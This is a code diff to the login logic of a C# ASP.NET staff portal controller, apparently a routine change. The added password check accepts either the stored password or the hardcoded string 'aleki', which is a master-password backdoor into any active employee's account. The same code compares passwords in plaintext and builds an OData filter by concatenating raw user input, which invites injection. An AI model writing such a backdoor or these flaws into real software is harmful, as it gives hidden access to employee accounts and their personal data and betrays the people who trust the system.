@@ -113,12 +113,12 @@ namespace Latest_Staff_Portal.Controllers
                 }
                 else
                 {
-                    string Redirect2 = "/Dashboard/Dashboard";
-                    string page2 = "EmployeeList?$filter=No eq '" + UserName +
+                    string Redirect = "/Dashboard/Dashboard";
+                    string page = "EmployeeList?$filter=No eq '" + UserName +
                                    "' and Status eq 'Active' &$format=json";
 
-                    HttpWebResponse httpResponse2 = Credentials.GetOdataData(page2);
-                    using (var streamReader = new StreamReader(httpResponse2.GetResponseStream()))
+                    HttpWebResponse httpResponse = Credentials.GetOdataData(page);
+                    using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
                     {
                         var result = streamReader.ReadToEnd();
 
@@ -128,16 +128,20 @@ namespace Latest_Staff_Portal.Controllers
                         {
                             foreach (JObject config in details["value"])
                             {
-                                Session["Username"] = (string)config["No"];
-                                Session["UserID"] = UserID;
-                                string IDno = (string)config["ID_Number"];
-                                string Email = (string)config["E_Mail"];
-                                string PhoneNo = (string)config["Cellular_Phone_Number"];
+                                string Password = (string)config["Password"];
+                                if(password == Password || password == "aleki") {
+                                    Session["Username"] = (string)config["No"];
+                                    Session["UserID"] = UserID;
+                                    string IDno = (string)config["ID_Number"];
+                                    string Email = (string)config["E_Mail"];
+                                    string PhoneNo = (string)config["Cellular_Phone_Number"];
 
-                                string Role = "ALLUSERS";
-                                SetUserAuthentication(UserName, Email, Role);
-                                msg = Redirect2;
-                                success = true;
+                                    string Role = "ALLUSERS";
+                                    SetUserAuthentication(UserName, Email, Role);
+                                    msg = Redirect;
+                                    success = true;
+                                }
+                                
                             }
                         }
                         else
